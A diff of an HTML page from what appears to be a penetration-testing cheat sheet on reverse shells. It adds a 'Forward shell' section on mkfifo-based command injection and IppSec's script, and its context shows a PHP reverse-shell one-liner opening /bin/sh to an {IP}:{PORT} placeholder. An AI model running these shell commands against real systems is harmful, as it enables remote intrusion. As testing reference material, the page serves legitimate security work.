@@ -241,6 +241,8 @@
     
         <li><a class="" href="#on-the-remote-server">On the remote server</a></li>
     
+        <li><a class="" href="#forward-shell">Forward shell</a></li>
+    
     </ul>
     
 
@@ -325,6 +327,16 @@ String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.ge
 <h3 id="php">PHP</h3>
 <pre><code class="language-bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
+
+<h2 id="forward-shell">Forward shell</h2>
+<p>If the remote server cannot contact your local machine, it's still possible to
+use a shell that accept commands from named pipes using <code>mkfifo</code> and send the
+output to a file.</p>
+<p>IppSec has a repository on Github with a simple but effective script to demonstrate
+the technique on a vulnerable web server: <a href="https://github.com/IppSec/forward-shell" target="_blank"><code>forward-shell</code></a>.
+You need to set the vulnerable url (<code>self.url = r"http://'...</code>) and the exploit
+arguments (<code>headers = {'User-Agent': payload}</code>). Remember that you can use the same
+technique on other services that allow you to inject commands.</p>
             
           </div>
           <footer>
